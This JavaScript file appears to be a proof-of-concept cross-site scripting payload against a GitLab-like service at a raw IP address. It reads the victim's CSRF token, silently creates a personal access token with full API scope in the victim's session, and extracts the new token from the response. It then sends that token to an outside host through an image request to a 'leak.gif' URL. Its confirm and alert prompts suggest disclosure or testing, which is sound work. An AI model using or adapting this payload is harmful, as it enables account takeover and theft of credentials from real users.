function next(token) {
fetch("https://65.52.77.188/-/profile/personal_access_tokens", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,sv-SE;q=0.8,sv;q=0.7",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded",
    "pragma": "no-cache",
    "sec-ch-ua": "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"",
    "sec-ch-ua-mobile": "?0",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "https://65.52.77.188/-/profile/personal_access_tokens",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "authenticity_token="+encodeURIComponent(token)+"&personal_access_token%5Bname%5D=asd&personal_access_token%5Bexpires_at%5D=&personal_access_token%5Bscopes%5D%5B%5D=api",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
}).then(response => response.text())
  .then(text => {
    const parser = new DOMParser();
    const htmlDocument = parser.parseFromString(text, "text/html");
    const token = htmlDocument.documentElement.querySelector("input[name='created-personal-access-token']").value
    alert("Created token is: " + token);
    const image = new Image();
    image.src = `//aw.rs/g/leak.gif?token=${token}`;
  });
}

function runner(){
  fetch(
    "https://65.52.77.188/-/profile/personal_access_tokens",
    {
      credentials: "include",
      method: "GET",
      mode: "cors"
    }
  ).then(response => response.text())
  .then(text => {
    const parser = new DOMParser();
    const htmlDocument = parser.parseFromString(text, "text/html");
var token = htmlDocument.documentElement.querySelector('meta[name="csrf-token"]').content;
    next(token)})
}

if(!donescript) {
  var donescript=true;
if (confirm("Create an access token?")) {
  runner();
}}
